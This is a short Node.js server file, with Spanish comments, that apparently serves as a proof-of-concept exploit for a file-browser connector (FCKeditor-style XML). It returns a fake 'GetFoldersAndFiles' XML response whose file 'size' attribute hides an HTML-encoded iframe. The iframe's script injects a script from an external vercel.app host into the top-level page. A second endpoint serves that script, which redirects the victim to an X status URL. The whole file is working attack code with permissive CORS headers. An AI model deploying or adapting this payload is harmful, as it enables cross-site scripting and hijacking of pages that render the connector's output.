const http = require('http');
const fs = require('fs');
const path = require('path');

const server = http.createServer((req, res) => {
    // Endpoint para el script de redirección
    if (req.url === '/redirect.js') {
        res.writeHead(200, { 
            'Content-Type': 'application/javascript',
            'Access-Control-Allow-Origin': '*'
        });
        res.end('window.location.href = "https://x.com/MDC_DEV/status/2045029575072141518";');
        return;
    }

    // Endpoint por defecto que devuelve el XML
    const xml = `<Connector command="GetFoldersAndFiles" resourceType="Document">
<CurrentFolder path="/1 - f/" url=""/>
<Folders/>
<Files>
<File desc="1" name="Loading..." size="&lt;iframe srcdoc=&quot;&lt;script&gt;let script=document.createElement('script');script.setAttribute('src','https://prueba-v5xy.vercel.app/redirect.js');window.top.document.head.appendChild(script);&lt;/script&gt;&quot;&gt;&lt;/iframe&gt;" url="1"/>
</Files>
</Connector>`;
    
    res.writeHead(200, { 
        'Content-Type': 'application/xml',
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, OPTIONS',
        'Access-Control-Allow-Headers': 'Content-Type'
    });
    res.end(xml);
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
